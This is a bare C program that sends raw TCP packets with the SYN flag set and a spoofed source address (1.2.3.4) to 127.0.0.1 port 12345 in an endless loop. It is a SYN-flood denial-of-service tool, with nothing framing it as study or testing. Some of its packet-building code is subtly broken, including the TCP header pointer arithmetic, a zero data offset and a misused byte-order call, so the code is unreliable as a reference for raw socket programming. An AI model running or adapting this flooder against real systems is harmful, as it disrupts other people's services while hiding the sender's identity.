#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define P 12345

unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum;

	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return ~sum;
}

int
main (int argc,
      char *argv[])
{
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	char datagram[4096];

	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct iphdr);
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(P);

	sin.sin_addr.s_addr = inet_addr("127.0.0.1");
	memset (datagram, 0, 4096);
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
	iph->id = htonl (54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr ("1.2.3.4");
	iph->daddr = sin.sin_addr.s_addr;
	tcph->source = htons (1234);
	tcph->dest = htons (P);
	tcph->seq = random ();
	tcph->ack_seq = 0;
	tcph->doff = 0;
	tcph->syn = 1;
	tcph->window = htonl (65535);
	tcph->check = 0;
	tcph->urg_ptr = 0;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	{
		int one = 1;
		const int *val = &one;
		if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
			printf ("Warning: Cannot set HDRINCL!\n");
	}

	while (1)
	{
		if (sendto ( s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin) ) < 0)
			printf ("error\n");
		else
			printf (".");
	}

	return 0;
}
